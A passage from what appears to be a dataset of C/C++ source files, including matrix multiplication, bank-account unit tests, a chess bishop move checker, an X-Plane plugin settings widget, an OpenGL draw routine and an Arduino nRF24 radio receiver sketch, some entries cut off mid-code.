vector<uint64_t> > C(n, vector<uint64_t>(n, 0));\n    vector<uint64_t> V(n, 0);\n\n    for (i = 0; i < n; ++i) {\n        for (j = 0; j < n; ++j) {\n            d1 = d1 * p1 + r1;\n            d2 = d2 * p2 + r2;\n            A[i][j] = d1 >> (32 - m1);\n            B[i][j] = d2 >> (32 - m2); \n        }\n    }\n\n    C = strassen(A, B);\n\n    for (i = 0; i < n; ++i) {\n        for (j = 0; j < n; ++j) {\n            V[i] ^= C[i][j];\n        }\n        cout << V[i] << \" \";\n    }\n\n    return 0;\n}\n",
    "#include \"Account.h\"\n#include <gtest/gtest.h>\n#include <gmock/gmock.h>\n#include \"Transaction.h\"\n#include <stdexcept>\n\nclass MAccount : public Account {\n private:\n  int id;\n  int balance;\n public:\n  MAccount(int id, int balance) : Account(id, balance) {}\n  MOCK_METHOD(int, GetBalance, (), (const, override));\n  MOCK_METHOD(void, ChangeBalance, (int), (override));\n  MOCK_METHOD(void, Lock, (), (override));\n  MOCK_METHOD(void, Unlock, (), (override));\n};\nclass MTransaction : public Transaction {\n public:\n  MTransaction() : Transaction() {}\n  MOCK_METHOD(void, SaveToDataBase, (Account& from, Account& to, int sum), (override));\n};\n\n\n\nTEST(account1, te1) {\n  Account uno(1, 100);\n  EXPECT_EQ(100, uno.GetBalance());\n  uno.Lock();\n  uno.ChangeBalance(2000);\n  uno.Unlock();\n  EXPECT_EQ(2100, uno.GetBalance());\n  try {\n    uno.ChangeBalance(1000000);\n  }\n  catch (std::runtime_error& el) {}\n  EXPECT_EQ(2100, uno.GetBalance());\n}\n\nTEST(transaction1, te1) {\n  Account uno(1, 10000);\n  Account dos(2, 10000);\n  Transaction tres;\n  Transaction quatro; quatro.set_fee(500);\n  try {tres.Make(uno, dos, 100);}\n  catch (std::logic_error& el2) {}\n  try {tres.Make(uno, dos, -100);}\n  catch (std::invalid_argument& q) {}\n  try {tres.Make(uno, dos, 0);}\n  catch (std::logic_error& q) {}\n  EXPECT_EQ(false, quatro.Make(uno, dos, 200));\n  tres.Make(uno, dos, 1999);\n  EXPECT_EQ(uno.GetBalance(), 10000); EXPECT_EQ(dos.GetBalance(), 9998);\n}\nusing ::testing::AtLeast;\nTEST(transaction2, te2) {\n  Account uno(1, 10000);\n  Account dos(2, 10000);\n  MTransaction tres;\n  EXPECT_CALL(tres, SaveToDataBase(uno, dos, 1999)).Times(AtLeast(1));\n  tres.Make(uno, dos, 1999);\n}\n\nTEST(account1, te2) {\n  MAccount uno(1, 1000);\n  EXPECT_CALL(uno, GetBalance()).Times(AtLeast(1));\n  uno.GetBalance();\n  EXPECT_CALL(uno, Lock()).Times(AtLeast(1));\n  uno.Lock();\n  EXPECT_CALL(uno, ChangeBalance(1)).Times(AtLeast(1));\n  uno.ChangeBalance(1);\n  EXPECT_CALL(uno, Unlock()).Times(AtLeast(1));\n  uno.Unlock();\n}\n\n",
    "#include \"Bishop.h\"\n\nint Bishop::checkLegalMove(Vector2i pos, Vector2i newPos, vector<vector<pieceType>> chessboard, bool color)\n{\n    /*\n        Funzione che controlla la validit\u00e1 della mossa\n    */\n    switch (color) // Controlla il colore del pezzo\n    {\n        // Bianco\n    case false:\n        // Verifica che la nuova posizione non sia un alleato o che sia vuota\n        if (chessboard[newPos.y][newPos.x] == pieceType::EMPTY || chessboard[newPos.y][newPos.x] >= pieceType::BLACKPAWN)\n        {\n            Vector2i valoreAssoluto;\n            valoreAssoluto.x = newPos.x - pos.x;\n            valoreAssoluto.y = newPos.y - pos.y;\n            // Verifica che la nuova posizione sia una cassella diagonale controllando che la differenza delle coordinate in valore assoluto siano uguali\n            if ((valoreAssoluto.x < 0 ? -valoreAssoluto.x : valoreAssoluto.x) == (valoreAssoluto.y < 0 ? -valoreAssoluto.y : valoreAssoluto.y))\n            {\n                Vector2i conta(1, 1);\n                conta.x = newPos.x > pos.x ? -conta.x : conta.x;\n                conta.y = newPos.y > pos.y ? -conta.y : conta.y;\n               \n                // Verifica che le caselle precedenti a quelle selezionate siano libere partendo dalla casella selezionato\n                while (chessboard[newPos.y][newPos.x] != pieceType::WHITEBISHOP)\n                {\n                    newPos.x += conta.x;\n                    newPos.y += conta.y;\n                 \n                    // Verifica che la casella sia libera e che non stia controllando che ci sia l'alfiere\n                    if (chessboard[newPos.y][newPos.x] > pieceType::EMPTY && chessboard[newPos.y][newPos.x] != pieceType::WHITEBISHOP)\n                        return 0;\n                }\n                // Se esce correttamente la ciclo allora la mossa \u00e9 valida\n                return 1;\n            }\n        }\n        break;\n\n        // Nero\n    case true:\n        //Controlla se la nuova posizione non \u00e9 un pezzo alleato\n        if (chessboard[newPos.y][newPos.x] <= pieceType::WHITEKING)\n        {\n            Vector2i valoreAssoluto;\n            valoreAssoluto.x = newPos.x - pos.x;\n            valoreAssoluto.y = newPos.y - pos.y;\n            // Verifica che la nuova posizione sia una cassella diagonale controllando che la differenza delle coordinate in valore assoluto siano uguali\n            if ((valoreAssoluto.x < 0 ? -valoreAssoluto.x : valoreAssoluto.x) == (valoreAssoluto.y < 0 ? -valoreAssoluto.y : valoreAssoluto.y))\n            {\n                Vector2i conta(1, 1);\n                conta.x = newPos.x > pos.x ? -conta.x : conta.x;\n                conta.y = newPos.y > pos.y ? -conta.y : conta.y;\n\n                // Verifica che le caselle precedenti a quelle selezionate siano libere partendo dalla casella selezionato\n                while (chessboard[newPos.y][newPos.x] != pieceType::BLACKBISHOP)\n                {\n                    newPos.x += conta.x;\n                    newPos.y += conta.y;\n\n                    // Verifica che la casella sia libera e che non stia controllando che ci sia l'alfiere\n                    if (chessboard[newPos.y][newPos.x] > pieceType::EMPTY && chessboard[newPos.y][newPos.x] != pieceType::BLACKBISHOP)\n                        return 0;\n                }\n                // Se esce correttamente la ciclo allora la mossa \u00e9 valida\n                return 1;\n            }\n        }\n        break;\n    }\n\n    // Se nessuna delle precedenti affermazioni risulta essere vera allora non era valida\n    return 0;\n}",
    "/*\n * This file is part of the Ivy distribution (https://github.com/KarinasHome/Ivy).\n * Copyright (c) 2019 Karina A.\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, version 3.\n *\n * This program is distributed in the hope that it will be useful, but\n * WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n * General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program. If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"IvyImguiWidget.h\"\n#include \"MyIvy.h\"\n#include <boost/range/adaptor/reversed.hpp>\n\n#include \"MyIvyConfigAircraft.h\"\n\n#include <iomanip> // setprecision\n#include <sstream> // stringstream\n\n#include <misc/cpp/imgui_stdlib.h>\n\n\nIvyImguiWidget::IvyImguiWidget(MyIvy *pIvyNew, int left, int top, int right, int bot, int decoration) :\n\tImgWindow(left, top, right, bot, decoration)\n{\n\tpIvy = pIvyNew;\n\tSetWindowTitle(\"The Nagging Co-Pilot\");\n\tSetVisible(false);\n\tconfigureImguiContext();\n}\n\n\nIvyImguiWidget::~IvyImguiWidget()\n{\n}\n\nvoid IvyImguiWidget::configureImguiContext()\n{\n\t/*ImGuiIO& io = ImGui::GetIO();\n\tio.Fonts->AddFontDefault();\n\tfont2 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/DejaVuSans.ttf\", 8.0f);\n\tfont3 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/DejaVuSans.ttf\", 10.0f);\n\tfont4 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/DejaVuSans.ttf\", 12.0f);\n\tfont5 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/DejaVuSansMono.ttf\", 8.0f);\n\tfont6 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/DejaVuSansMono.ttf\", 16.0f);\n\tfont7 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/DejaVuSansMono.ttf\", 18.0f);\n\tfont8 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/Inconsolata.ttf\", 8.0f);\n\tfont9 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/Inconsolata.ttf\", 22.0f);\n\tfont10 = io.Fonts->AddFontFromFileTTF(\"./Resources/fonts/Inconsolata.ttf\", 24.0f);*/\n\n}\n\nvoid IvyImguiWidget::Visible(bool visible)\n{\n\tSetVisible(visible);\n\tif (visible)\n\t{\n\t\toutput_dh = XPLMGetDataf(pIvy->m_f_decision_height);\n\n\t\tselected_radio = 0;\n\n\t\tfor (int index = 0; index < pIvy->m_ivyConfig->m_audio_dirs.size(); index++)\n\t\t{\n\t\t\tif (pIvy->m_ivyConfig->m_audio_dirs[index].compare(pIvy->m_ivyConfig->m_mp3_dir) == 0)\n\t\t\t\tselected_radio = index;\n\t\t}\n\t}\n}\n\nvoid IvyImguiWidget::buildInterface() \n{\n\t\n\twin_width = ImGui::GetWindowWidth();\n\twin_height = ImGui::GetWindowHeight();\n\n\tImGui::Spacing();\n\tImGui::Columns(6, 0, false);\n\tImGui::PushStyleVar(ImGuiStyleVar_FrameRounding, 5.f);\n\tif (ImGui::Button(\"MyFlight\", ImVec2(150, 20))) selected_tab = 1;\n\tImGui::NextColumn();\n\tif (ImGui::Button(\"Graphs\", ImVec2(150, 20))) selected_tab = 2;\n\tImGui::NextColumn();\n\tif (ImGui::Button(\"Areas of Concern\", ImVec2(150, 20))) selected_tab = 3;\n\tImGui::NextColumn();\n\tif (ImGui::Button(\"Logbook\", ImVec2(150, 20))) selected_tab = 4;\n\tImGui::NextColumn();\n\tif (ImGui::Button(\"Aircraft Configuration\", ImVec2(180, 20))) selected_tab = 6;\n\tImGui::NextColumn();\n\tif (ImGui::Button(\"Settings\", ImVec2(150, 20))) selected_tab = 5;\n\tImGui::Columns(1);\n\tImGui::PopStyleVar();\n\tImGui::Separator();\n\tif (selected_tab == 1) {\n\t\tImGui::Columns(2, 0, true);\n\t\tImGui::SetColumnWidth(-1, 150);\n\n\t\t\n\t\tImGui::Text(\"Volume:\");\n\t\tImGui::Spacing();\n\t\tImGui::SliderFloat(\"##Volume\", &(pIvy->m_ivyConfig->m_ivyVolume), 0.1, 1, \"%.1f\");\n\n\t\tImGui::Text(\"Call-Outs:\");\n\t\t//for (int i = 0; i < (cols - 1); i++) ImGui::NextColumn();\n\t\tImGui::Checkbox(\" 60 kt\", &(pIvy->m_ivyConfig->m_kt60_enabled));\n\t\tImGui::Checkbox(\" 80 kt\", &(pIvy->m_ivyConfig->m_kt80_enabled));\n\t\tImGui::Checkbox(\"100 kt\", &(pIvy->m_ivyConfig->m_kt100_enabled));\n\t\tImGui::Checkbox(\" 60 kt Landing\", &(pIvy->m_ivyConfig->m_kt60__landing_enabled));\n\n\t\t//ImGui::NextColumn();\n\t\tImGui::Text(\" \");\n\t\tImGui::InputInt(\"V1\", &(pIvy->m_ivyAircraft->m_li_v1), 1, 1);\n\t\t\n\t\t\n\t\tImGui::InputInt(\"VR\", &(pIvy->m_ivyAircraft->m_li_vr), 1, 1);\n\t\t\n\t\t\n\t\t\n\t\tImGui::InputInt(\"V2\", &(pIvy->m_ivyAircraft->m_li_v2), 1, 1);\n\n\t\t\n\n\t\toutput_dh = XPLMGetDataf(pIvy->m_f_decision_height);\n\t\t\n\t\t//output_dh = XPLMGetDataf(pIvy->m_f_decision_height);\n\t\tImGui::InputFloat(\"DH\", &output_dh,1,1,0,0);\n\t\tXPLMSetDataf(pIvy->m_f_decision_height, output_dh);\n\n\t\t//ImGui::Text(\"Transition Alt.:\");\n\t\t//ImGui::InputFloat(\"##Transition\", &(pIvy->m_ivyConfig->m_trans_alt), 1000, 1000, 0, 0);\n\n\t\tImGui::Spacing();\n\t\tImGui::Checkbox(\"NOE Enable\", &(pIvy->m_ivyAircraft->m_max_alt_enable));\n\n\t\tif (pIvy->m_ivyAircraft->m_is_206B3 == true)\n\t\t{\n\t\t\tImGui::InputFloat(\"MTBF\", &(pIvy->m_ivyAircraft->m_206B3_MTBF), 0.1, 1, 1, 0);\n\t\t}\n\t\tif (pIvy->m_ivyAircraft->m_is_206L3 == true)\n\t\t{\n\t\t\tImGui::InputFloat(\"MTBF\", &(pIvy->m_ivyAircraft->m_206L3_MTBF), 0.1, 1, 1, 0);\n\t\t}\n\t\t\n\t\tImGui::NextColumn();\n\t\t//const char* listbox_items[1000];\n\n\t\tImGui::Text(\"Events :\");\n\n\t\tfor (auto line : pIvy->m_er",
    "#include \"game_object.hpp\"\n\nGameObject::GameObject(ResourcesManager *resourcesManager, std::string modelName) {\n    this->resourcesManager = resourcesManager;\n    this->position = glm::vec3(0, 0, 0);\n    this->rotate = glm::vec3(0, 0, 0);\n    this->scale = glm::vec3(1, 1, 1);\n\n    this->name = modelName;\n    this->model = resourcesManager->getModel(modelName);\n}\n\n// TODO: shaders should be provided by materials\nvoid GameObject::draw(Camera *camera, Shader *shader) {\n    // glBindVertexArray(VAO);\n   \n\n\tglm::mat4 model = glm::mat4(1.0f);\n\tmodel = glm::translate(model, this->position);\n    model = glm::scale(model, this->scale);\n\t// TODO: impl rotating model = glm::rotate()\n\n    // TODO: move binding to material\n\t// Bind model matrix\n\tshader->setMat4(\"model\", model);\n\n    // Material bind\n\tshader->setVec3(\"material.ambient\", glm::vec3(0.3f, 0.3f, 0.3f));\n\tshader->setVec3(\"material.diffuse\", glm::vec3(0.6f, 0.6f, 0.6f));\n\tshader->setVec3(\"material.specular\", glm::vec3(0.633f, 0.727811f, 0.633f));\n\tshader->setFloat(\"material.shininess\", 76.8f);\n\n    this->model->Draw(*shader);\n}",
    "/*   \u0414\u0430\u043d\u043d\u044b\u0439 \u0441\u043a\u0435\u0442\u0447 \u0434\u0435\u043b\u0430\u0435\u0442 \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0435\u0435: \n*/\n\n#include \"SPI.h\"\n#include \"nRF24L01.h\"\n#include \"RF24.h\"\n\nRF24 radio(9, 10);  // \"\u0441\u043e\u0437\u0434\u0430\u0442\u044c\" \u043c\u043e\u0434\u0443\u043b\u044c \u043d\u0430 \u043f\u0438\u043d\u0430\u0445 9 \u0438 10 \u0414\u043b\u044f \u0423\u043d\u043e\nbyte counter;\n\nvoid setup() {\n  Serial.begin(9600);         // \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u043f\u043e\u0440\u0442 \u0434\u043b\u044f \u0441\u0432\u044f\u0437\u0438 \u0441 \u041f\u041a\n  pinMode(2, INPUT_PULLUP);\n  radio.begin();              // \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u043c\u043e\u0434\u0443\u043b\u044c\n  //radio.setAutoAck(0);        // \u0440\u0435\u0436\u0438\u043c \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u0440\u0438\u0451\u043c\u0430, 1 \u0432\u043a\u043b 0 \u0432\u044b\u043a\u043b\n  //radio.setRetries(0, 15);    // (\u0432\u0440\u0435\u043c\u044f \u043c\u0435\u0436\u0434\u0443 \u043f\u043e\u043f\u044b\u0442\u043a\u043e\u0439 \u0434\u043e\u0441\u0442\u0443\u0447\u0430\u0442\u044c\u0441\u044f, \u0447\u0438\u0441\u043b\u043e \u043f\u043e\u043f\u044b\u0442\u043e\u043a)\n  //radio.enableAckPayload();   // \u0440\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c \u043e\u0442\u0441\u044b\u043b\u043a\u0443 \u0434\u0430\u043d\u043d\u044b\u0445 \u0432 \u043e\u0442\u0432\u0435\u0442 \u043d\u0430 \u0432\u0445\u043e\u0434\u044f\u0449\u0438\u0439 \u0441\u0438\u0433\u043d\u0430\u043b\n  //radio.enableDynamicAck();                                  // \u0420\u0430\u0437\u0440\u0435\u0448\u0430\u0435\u043c \u0432\u044b\u0431\u043e\u0440\u043e\u0447\u043d\u043e \u043e\u0442\u043a\u043b\u044e\u0447\u0430\u0442\u044c \u0437\u0430\u043f\u0440\u043e\u0441\u044b \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\n  radio.setPayloadSize(32);   // \u0440\u0430\u0437\u043c\u0435\u0440 \u043f\u0430\u043a\u0435\u0442\u0430, \u0432 \u0431\u0430\u0439\u0442\u0430\u0445\n  radio.openWritingPipe(0x7878787878LL);  // \u043c\u044b - \u0442\u0440\u0443\u0431\u0430 0, \u043e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u043a\u0430\u043d\u0430\u043b \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0434\u0430\u043d\u043d\u044b\u0445\n  radio.openReadingPipe (0, 0x7878787878LL); // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c 0 \u0442\u0440\u0443\u0431\u0443 \u0441 \u0430\u0434\u0440\u0435\u0441\u043e\u043c 2 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 0xAABBCCDD22, \u0434\u043b\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\n  radio.openReadingPipe (1, 0xAABBCCDD11LL); // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c 1 \u0442\u0440\u0443\u0431\u0443 \u0441 \u0430\u0434\u0440\u0435\u0441\u043e\u043c 2 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 0xAABBCCDD22, \u0434\u043b\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\n  radio.openReadingPipe (2, 0xAABBCCDD22LL); // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c 2 \u0442\u0440\u0443\u0431\u0443 \u0441 \u0430\u0434\u0440\u0435\u0441\u043e\u043c 2 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 0xAABBCCDD22, \u0434\u043b\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\n  radio.openReadingPipe (3, 0xAABBCCDD33LL); // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c 3 \u0442\u0440\u0443\u0431\u0443 \u0441 \u0430\u0434\u0440\u0435\u0441\u043e\u043c 2 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 0xAABBCCDD22, \u0434\u043b\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\n  radio.openReadingPipe (4, 0xAABBCCDD44LL); // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c 4 \u0442\u0440\u0443\u0431\u0443 \u0441 \u0430\u0434\u0440\u0435\u0441\u043e\u043c 2 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 0xAABBCCDD22, \u0434\u043b\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\n  radio.openReadingPipe (5, 0xAABBCCDD55LL); // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c 5 \u0442\u0440\u0443\u0431\u0443 \u0441 \u0430\u0434\u0440\u0435\u0441\u043e\u043c 2 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 0xAABBCCDD22, \u0434\u043b\u044f \u043f\u0440\u0438\u0435\u043c\u0430 \u0434\u0430\u043d\u043d\u044b\u0445.\n  radio.setChannel(0x60); // \u0432\u044b\u0431\u0438\u0440\u0430\u0435\u043c \u043a\u0430\u043d\u0430\u043b (\u0432 \u043a\u043e\u0442\u043e\u0440\u043e\u043c \u043d\u0435\u0442 \u0448\u0443\u043c\u043e\u0432!)\n  //radio.setAutoAck( false );\n  radio.setPALevel (RF24_PA_MAX); // \u0443\u0440\u043e\u0432\u0435\u043d\u044c \u043c\u043e\u0449\u043d\u043e\u0441\u0442\u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430. \u041d\u0430 \u0432\u044b\u0431\u043e\u0440 RF24_PA_MIN, RF24_PA_LOW, RF24_PA_HIGH, RF24_PA_MAX\n  radio.setDataRate (RF24_2MBPS); // \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u044c \u043e\u0431\u043c\u0435\u043d\u0430. \u041d\u0430 \u0432\u044b\u0431\u043e\u0440 RF24_2MBPS, RF24_1MBPS, RF24_250KBPS\n                                  //\u0434\u043e\u043b\u0436\u043d\u0430 \u0431\u044b\u0442\u044c \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u0430 \u043d\u0430 \u043f\u0440\u0438\u0451\u043c\u043d\u0438\u043a\u0435 \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0435!\n                                  //\u043f\u0440\u0438 \u0441\u0430\u043c\u043e\u0439 \u043d\u0438\u0437\u043a\u043e\u0439 \u0441\u043a\u043e\u0440\u043e\u0441\u0442\u0438 \u0438\u043c\u0435\u0435\u043c \u0441\u0430\u043c\u0443\u044e \u0432\u044b\u0441\u043e\u043a\u0443\u044e \u0447\u0443\u0432\u0441\u0442\u0432\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0438 \u0434\u0430\u043b\u044c\u043d\u043e\u0441\u0442\u044c!!\n\n  radio.powerUp();        // \u043d\u0430\u0447\u0430\u0442\u044c \u0440\u0430\u0431\u043e\u0442\u0443\n  radio.startListening(); // \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0441\u043b\u0443\u0448\u0430\u0442\u044c \u044d\u0444\u0438\u0440, \u043c\u044b \u043f\u0440\u0438\u0451\u043c\u043d\u044b\u0439 \u043c\u043e\u0434\u0443\u043b\u044c\n}\n\nvoid loop(){  \n  byte pipeNo, gotByte;          \n    if(radio.available(&pipeNo)){                                // \u0415\u0441\u043b\u0438 \u0432 \u0431\u0443\u0444\u0435\u0440\u0435 \u0438\u043c\u0435\u044e\u0442\u0441\u044f \u043f\u0440\u0438\u043d\u044f\u0442\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435, \u0442\u043e \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u043d\u043e\u043c\u0435\u0440 \u0442\u0440\u0443\u0431\u044b \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u044d\u0442\u0438 \u0434\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u0432 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0443\u044e pipe.\n        radio.read( &gotByte, sizeof(gotByte) );                 // \u0427\u0438\u0442\u0430\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 \u0431\u0443\u0444\u0435\u0440\u0430 \u0432 \u043c\u0430\u0441\u0441\u0438\u0432 gotByte \u0443\u043a\u0430\u0437\u044b\u0432\u0430\u044f \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0432\u0441\u0435\u0433\u043e \u0431\u0430\u0439\u0442 \u043c\u043e\u0436\u0435\u0442 \u043f\u043e\u043c\u0435\u0441\u0442\u0438\u0442\u044c\u0441\u044f \u0432 \u043c\u0430\u0441\u0441\u0438\u0432.\n        if(pipeNo==0){ /* \u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043f\u043e 0 \u0442\u0440\u0443\u0431\u0435 */ \n                      radio.stopListening   ();                              // \u0412\u044b\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u043f\u0440\u0438\u0451\u043c\u043d\u0438\u043a, \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u043c \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u0445 \u0442\u0440\u0443\u0431.\n                      Serial.print(\"Recieved 0 : \");\n                      Serial.println(gotByte);\n                      delay(500);\n                      radio.startListening(); // \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0441\u043b\u0443\u0448\u0430\u0442\u044c \u044d\u0444\u0438\u0440, \u043c\u044b \u043f\u0440\u0438\u0451\u043c\u043d\u044b\u0439 \u043c\u043e\u0434\u0443\u043b\u044c\n                  }         // \u0415\u0441\u043b\u0438 \u0434\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043e\u0442 0 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 (\u043f\u043e 0 \u0442\u0440\u0443\u0431\u0435), \u0442\u043e \u043c\u043e\u0436\u043d\u043e \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 ...\n        if(pipeNo==1){ /* \u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043f\u043e 1 \u0442\u0440\u0443\u0431\u0435 */ \n                      radio.stopListening   ();                              // \u0412\u044b\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u043f\u0440\u0438\u0451\u043c\u043d\u0438\u043a, \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u043c \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u0445 \u0442\u0440\u0443\u0431.\n                      Serial.print(\"Recieved 1 : \");\n                      Serial.println(gotByte);\n                      delay(500);\n                      radio.startListening(); // \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0441\u043b\u0443\u0448\u0430\u0442\u044c \u044d\u0444\u0438\u0440, \u043c\u044b \u043f\u0440\u0438\u0451\u043c\u043d\u044b\u0439 \u043c\u043e\u0434\u0443\u043b\u044c\n                  }         // \u0415\u0441\u043b\u0438 \u0434\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043e\u0442 1 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 (\u043f\u043e 1 \u0442\u0440\u0443\u0431\u0435), \u0442\u043e \u043c\u043e\u0436\u043d\u043e \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 ...\n        if(pipeNo==2){ /* \u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043f\u043e 2 \u0442\u0440\u0443\u0431\u0435 */ \n                      radio.stopListening   ();                              // \u0412\u044b\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u043f\u0440\u0438\u0451\u043c\u043d\u0438\u043a, \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u043c \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u0445 \u0442\u0440\u0443\u0431.\n                      Serial.print(\"Recieved 2 : \");\n                      Serial.println(gotByte);\n                      delay(500);\n                      radio.startListening(); // \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0441\u043b\u0443\u0448\u0430\u0442\u044c \u044d\u0444\u0438\u0440, \u043c\u044b \u043f\u0440\u0438\u0451\u043c\u043d\u044b\u0439 \u043c\u043e\u0434\u0443\u043b\u044c\n                  ;\n                  }         // \u0415\u0441\u043b\u0438 \u0434\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043e\u0442 2 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u0447\u0438\u043a\u0430 (\u043f\u043e 2 \u0442\u0440\u0443\u0431\u0435), \u0442\u043e \u043c\u043e\u0436\u043d\u043e \u0432\u044b\u043f\u043e\u043b\u043d\u0438\u0442\u044c \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0443\u044e\u0449\u0435\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 ...\n        if(pipeNo==3){ /* \u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u0448\u043b\u0438 \u043f\u043e 3 \u0442\u0440\u0443\u0431\u0435 */ \n                      radio.stopListening   ();                              // \u0412\u044b\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u043f\u0440\u0438\u0451\u043c\u043d\u0438\u043a, \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u043c \u043f\u0440\u043e\u0441\u043b\u0443\u0448\u0438\u0432\u0430\u043d\u0438\u0435 \u043e\u0442\u043a\u0440\u044b\u0442\u044b\u0445 \u0442\u0440\u0443\u0431.\n                      Serial.print(\"Recieved 3 : \");\n                      Serial.println(gotByte);\n                      delay(500);\n                      radio.startListening(); // \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u043c \u0441\u043b\u0443\u0448\u0430\u0442\u044c \u044d\u0444\u0438\u0440, \u043c\u044b \u043f\u0440\u0438\u0451\u043c\u043d\u044b\u0439 \u043c\u043e\u0434\u0443\u043b\u044c\n                  ;\n                  }         // \u0415\u0441\u043b\u0438 \u0434\u0430\u043d\u043d\u044b\u0435 